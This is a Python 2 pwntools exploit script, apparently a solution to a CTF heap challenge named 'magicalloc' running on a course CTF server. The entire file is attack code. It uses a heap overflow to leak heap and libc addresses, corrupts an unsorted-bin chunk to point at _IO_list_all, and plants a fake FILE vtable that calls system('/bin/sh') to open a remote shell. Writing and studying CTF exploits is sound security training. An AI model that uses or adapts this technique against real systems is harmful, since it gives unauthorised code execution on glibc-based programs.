#!/usr/bin/env python2
from pwn import *

file1, file2  = "./magicalloc", "./libc-2.23.so"
# server, port = 'localhost'  , 9999
server, port = 'csie.ctf.tw', 10146

r, context.binary = remote(server, port), file1
# ========================================================================
binary, libc = ELF(file1), ELF(file2)

# *************************
#      Magic Allocator     
# *************************
#  1. Alloc                
#  2. Free                 
#  3. Edit                 
#  4. Show                 
#  3. Exit                 
# *************************

def Alloc( size ):
    r.sendlineafter( "Your choice:"         , "1"       )
    r.sendlineafter( "Size:"                , str(size) )

def Free( idx ):
    r.sendlineafter( "Your choice:"         , "2"       )
    r.sendlineafter( "Index:"               , str(idx)  )

def Edit( idx, size, data ):
    r.sendlineafter( "Your choice:"         , "3"       )
    r.sendlineafter( "Index:"               , str(idx)  )
    r.sendlineafter( "Size:"                , str(size) )
    r.sendlineafter( "Data:"                , data      )

def Show( idx ):
    r.sendlineafter( "Your choice:"         , "4"       )
    r.sendlineafter( "Index:"               , str(idx)  )

def Exit():
    r.sendlineafter( "Your choice:"         , "5"       )

r.sendlineafter( "Name:"                    , "a"*0x20  )
Alloc(0x80)
Alloc(0x80)
Alloc(0x80)
Show(0)
r.recvuntil( "a"*0x20 )
heap= u64(r.recvuntil("\n")[:-1].ljust(8, "\x00")) - 0x10
print "heap:", hex(heap)

Free(1)
Edit(0, 0x200, "a"*0x90)
Show(0)
r.recvuntil("a"*0x90)
libc_base = u64(r.recvuntil("\n")[:-1].ljust(8, "\x00")) - 0x3c4b78
print "libc_base:", hex(libc_base)

io_list_all = libc_base + 0x3c5520

fd, bk = 0, io_list_all - 0x10
Edit( 0, 0x200, "a"*0x80 + "/bin/sh\x00" + p64(0x61) + p64(fd) + p64(bk) + p64(0) + p64(1))
vtable = heap + 0x170
system = libc_base + 0x45390
Edit( 2, 0x100, "\x00"*0x38 + p64(vtable) + "b"*0x18 + p64(system) )
r.interactive()
